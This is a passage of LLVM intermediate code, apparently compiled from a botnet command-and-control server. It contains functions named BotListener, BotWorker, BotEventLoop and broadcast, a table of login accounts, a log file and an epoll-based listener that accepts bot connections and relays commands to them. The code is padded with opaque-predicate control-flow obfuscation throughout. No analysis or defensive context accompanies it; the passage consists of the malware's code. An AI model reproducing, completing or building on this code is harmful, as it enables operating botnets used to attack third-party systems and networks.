  %2145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* %2143, i8* %2144)
  %2146 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0))
  store %struct._IO_FILE* %2146, %struct._IO_FILE** %65, align 8
  %2147 = call i64 @time(i64* null) #7
  store i64 %2147, i64* %66, align 8
  %2148 = call %struct.tm* @gmtime(i64* %66) #7
  store %struct.tm* %2148, %struct.tm** %67, align 8
  %2149 = getelementptr inbounds [50 x i8], [50 x i8]* %68, i32 0, i32 0
  %2150 = load %struct.tm*, %struct.tm** %67, align 8
  %2151 = call i64 @strftime(i8* %2149, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), %struct.tm* %2150) #7
  %2152 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %2153 = getelementptr inbounds [50 x i8], [50 x i8]* %68, i32 0, i32 0
  %2154 = load i32, i32* %13, align 4
  %2155 = sext i32 %2154 to i64
  %2156 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %2155
  %2157 = getelementptr inbounds %struct.login_info, %struct.login_info* %2156, i32 0, i32 0
  %2158 = getelementptr inbounds [20 x i8], [20 x i8]* %2157, i32 0, i32 0
  %2159 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %2160 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2152, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i8* %2153, i8* %2158, i8* %2159)
  %2161 = load %struct._IO_FILE*, %struct._IO_FILE** %65, align 8
  %2162 = call i32 @fclose(%struct._IO_FILE* %2161)
  %2163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %2164 = load i32, i32* %12, align 4
  %2165 = load i32, i32* %13, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %2166
  %2168 = getelementptr inbounds %struct.login_info, %struct.login_info* %2167, i32 0, i32 0
  %2169 = getelementptr inbounds [20 x i8], [20 x i8]* %2168, i32 0, i32 0
  call void @broadcast(i8* %2163, i32 %2164, i8* %2169)
  %2170 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2170, i8 0, i64 2048, i32 16, i1 false)
  br label %originalBB241
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %2 = load i32, i32* @x.17
  %3 = load i32, i32* @y.18
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  %18 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %18, i32* %12, align 4
  %19 = load i32, i32* %12, align 4
  %20 = icmp slt i32 %19, 0
  %21 = load i32, i32* @x.17
  %22 = load i32, i32* @y.18
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %30

; <label>:29:                                     ; preds = %originalBBpart2
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.78, i32 0, i32 0))
  br label %30

; <label>:30:                                     ; preds = %29, %originalBBpart2
  %31 = bitcast %struct.sockaddr_in* %15 to i8*
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 16, i32 4, i1 false)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %34 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %33, i32 0, i32 0
  store i32 0, i32* %34, align 4
  %35 = load i32, i32* %11, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = load i32, i32* %12, align 4
  %40 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %41 = call i32 @bind(i32 %39, %struct.sockaddr* %40, i32 16) #7
  %42 = icmp slt i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %30
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0))
  br label %44

; <label>:44:                                     ; preds = %43, %30
  %45 = load i32, i32* %12, align 4
  %46 = call i32 @listen(i32 %45, i32 5) #7
  store i32 16, i32* %14, align 4
  br label %47

; <label>:47:                                     ; preds = %originalBBpart28, %44
  %48 = load i32, i32* %12, align 4
  %49 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %50 = call i32 @accept(i32 %48, %struct.sockaddr* %49, i32* %14)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 0
  br i1 %52, label %53, label %70

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* @x.17
  %55 = load i32, i32* @y.18
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i32 0, i32 0))
  %62 = load i32, i32* @x.17
  %63 = load i32, i32* @y.18
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:70:                                     ; preds = %originalBBpart24, %47
  %71 = load i32, i32* @x.17
  %72 = load i32, i32* @y.18
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %13, align 4
  %80 = sext i32 %79 to i64
  %81 = inttoptr i64 %80 to i8*
  %82 = call i32 @pthread_create(i64* %17, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %81) #7
  %83 = load i32, i32* @x.17
  %84 = load i32, i32* @y.18
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %47
                                                  ; No predecessors!
  %92 = load i8*, i8** %10, align 8
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %1
  %93 = alloca i8*, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  %98 = alloca %struct.sockaddr_in, align 4
  %99 = alloca %struct.sockaddr_in, align 4
  %100 = alloca i64, align 8
  store i32 %0, i32* %94, align 4
  %101 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %101, i32* %95, align 4
  %102 = load i32, i32* %95, align 4
  %103 = icmp slt i32 %102, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %104 = load i32, i32* %13, align 4
  %105 = sext i32 %104 to i64
  %106 = inttoptr i64 %105 to i8*
  %107 = call i32 @pthread_create(i64* %17, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %106) #7
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* @x.19
  %18 = load i32, i32* @y.20
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %26 = load i8**, i8*** %6, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %25, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i32 0, i32 0), i8* %28)
  call void @exit(i32 1) #10
  %30 = load i32, i32* @x.19
  %31 = load i32, i32* @y.20
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:38:                                     ; preds = %3
  %39 = load i32, i32* @x.19
  %40 = load i32, i32* @y.20
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8**, i8*** %6, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 3
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @atoi(i8* %49) #8
  store i32 %50, i32* %10, align 4
  %51 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0))
  store %struct._IO_FILE* %51, %struct._IO_FILE** @telFD, align 8
  %52 = load i8**, i8*** %6, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @atoi(i8* %54) #8
  store i32 %55, i32* %9, align 4
  %56 = load i8**, i8*** %6, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 1
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @create_and_bind(i8* %58)
  store volatile i32 %59, i32* @listenFD, align 4
  %60 = load volatile i32, i32* @listenFD, align 4
  %61 = icmp eq i32 %60, -1
  %62 = load i32, i32* @x.19
  %63 = load i32, i32* @y.20
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %61, label %70, label %71

; <label>:70:                                     ; preds = %originalBBpart24
  call void @abort() #10
  unreachable

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @make_socket_non_blocking(i32 %72)
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %71
  call void @abort() #10
  unreachable

; <label>:77:                                     ; preds = %71
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = call i32 @listen(i32 %78, i32 128) #7
  store i32 %79, i32* %8, align 4
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %77
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:83:                                     ; preds = %77
  %84 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %84, i32* @epollFD, align 4
  %85 = load volatile i32, i32* @epollFD, align 4
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %83
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @x.19
  %90 = load i32, i32* @y.20
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load volatile i32, i32* @listenFD, align 4
  %98 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %99 = bitcast %union.epoll_data* %98 to i32*
  store i32 %97, i32* %99, align 1
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %100, align 1
  %101 = load volatile i32, i32* @epollFD, align 4
  %102 = load volatile i32, i32* @listenFD, align 4
  %103 = call i32 @epoll_ctl(i32 %101, i32 1, i32 %102, %struct.epoll_event* %11) #7
  store i32 %103, i32* %8, align 4
  %104 = load i32, i32* %8, align 4
  %105 = icmp eq i32 %104, -1
  %106 = load i32, i32* @x.19
  %107 = load i32, i32* @y.20
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %105, label %114, label %115

; <label>:114:                                    ; preds = %originalBBpart28
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:115:                                    ; preds = %originalBBpart28
  %116 = load i32, i32* %9, align 4
  %117 = add nsw i32 %116, 2
  %118 = zext i32 %117 to i64
  %119 = call i8* @llvm.stacksave()
  store i8* %119, i8** %12, align 8
  %120 = alloca i64, i64 %118, align 16
  br label %121

; <label>:121:                                    ; preds = %141, %115
  %122 = load i32, i32* @x.19
  %123 = load i32, i32* @y.20
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i32, i32* %9, align 4
  %131 = add nsw i32 %130, -1
  store i32 %131, i32* %9, align 4
  %132 = icmp ne i32 %130, 0
  %133 = load i32, i32* @x.19
  %134 = load i32, i32* @y.20
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart221, label %originalBB10alteredBB

originalBBpart221:                                ; preds = %originalBB10
  br i1 %132, label %141, label %147

; <label>:141:                                    ; preds = %originalBBpart221
  %142 = load i32, i32* %9, align 4
  %143 = add nsw i32 %142, 1
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i64, i64* %120, i64 %144
  %146 = call i32 @pthread_create(i64* %145, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  br label %121

; <label>:147:                                    ; preds = %originalBBpart221
  %148 = getelementptr inbounds i64, i64* %120, i64 0
  %149 = load i32, i32* %10, align 4
  %150 = sext i32 %149 to i64
  %151 = inttoptr i64 %150 to i8*
  %152 = call i32 @pthread_create(i64* %148, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %151) #7
  br label %153

; <label>:153:                                    ; preds = %154, %147
  br label %154

; <label>:154:                                    ; preds = %153
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0))
  %155 = call i32 @sleep(i32 60)
  br label %153
                                                  ; No predecessors!
  %157 = load i32, i32* %4, align 4
  ret i32 %157

originalBBalteredBB:                              ; preds = %originalBB, %16
  %158 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %159 = load i8**, i8*** %6, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 0
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %158, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i32 0, i32 0), i8* %161)
  call void @exit(i32 1) #10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %163 = load i8**, i8*** %6, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 3
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @atoi(i8* %165) #8
  store i32 %166, i32* %10, align 4
  %167 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0))
  store %struct._IO_FILE* %167, %struct._IO_FILE** @telFD, align 8
  %168 = load i8**, i8*** %6, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 2
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #8
  store i32 %171, i32* %9, align 4
  %172 = load i8**, i8*** %6, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 1
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @create_and_bind(i8* %174)
  store volatile i32 %175, i32* @listenFD, align 4
  %176 = load volatile i32, i32* @listenFD, align 4
  %177 = icmp eq i32 %176, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %178 = load volatile i32, i32* @listenFD, align 4
  %179 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %180 = bitcast %union.epoll_data* %179 to i32*
  store i32 %178, i32* %180, align 1
  %181 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %181, align 1
  %182 = load volatile i32, i32* @epollFD, align 4
  %183 = load volatile i32, i32* @listenFD, align 4
  %184 = call i32 @epoll_ctl(i32 %182, i32 1, i32 %183, %struct.epoll_event* %11) #7
  store i32 %184, i32* %8, align 4
  %185 = load i32, i32* %8, align 4
  %186 = icmp eq i32 %185, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %187 = load i32, i32* %9, align 4
  %_ = sub i32 %187, -1
  %gen = mul i32 %_, -1
  %_11 = sub i32 0, %187
  %gen12 = add i32 %_11, -1
  %_13 = sub i32 %187, -1
  %gen14 = mul i32 %_13, -1
  %_15 = sub i32 %187, -1
  %gen16 = mul i32 %_15, -1
  %_17 = sub i32 0, %187
  %gen18 = add i32 %_17, -1
  %_19 = shl i32 %187, -1
  %188 = add nsw i32 %187, -1
  store i32 %188, i32* %9, align 4
  %189 = icmp ne i32 %187, 0
  br label %originalBB10
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.88, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %156

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %originalBBpart212, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %131

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %28
  %42 = load i32, i32* @x.21
  %43 = load i32, i32* @y.22
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* @x.21
  %51 = load i32, i32* @y.22
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %111

; <label>:58:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %59 = load i32, i32* %8, align 4
  %60 = bitcast i32* %9 to i8*
  %61 = call i32 @setsockopt(i32 %59, i32 1, i32 2, i8* %60, i32 4) #7
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %80

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.21
  %65 = load i32, i32* @y.22
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  %72 = load i32, i32* @x.21
  %73 = load i32, i32* @y.22
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %58
  %81 = load i32, i32* %8, align 4
  %82 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %83 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %82, i32 0, i32 5
  %84 = load %struct.sockaddr*, %struct.sockaddr** %83, align 8
  %85 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %86 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %85, i32 0, i32 4
  %87 = load i32, i32* %86, align 8
  %88 = call i32 @bind(i32 %81, %struct.sockaddr* %84, i32 %87) #7
  store i32 %88, i32* %7, align 4
  %89 = load i32, i32* %7, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %108

; <label>:91:                                     ; preds = %80
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* @x.21
  %101 = load i32, i32* @y.22
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %131

; <label>:108:                                    ; preds = %80
  %109 = load i32, i32* %8, align 4
  %110 = call i32 @close(i32 %109)
  br label %111

; <label>:111:                                    ; preds = %108, %originalBBpart2
  %112 = load i32, i32* @x.21
  %113 = load i32, i32* @y.22
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %121 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %120, i32 0, i32 7
  %122 = load %struct.addrinfo*, %struct.addrinfo** %121, align 8
  store %struct.addrinfo* %122, %struct.addrinfo** %6, align 8
  %123 = load i32, i32* @x.21
  %124 = load i32, i32* @y.22
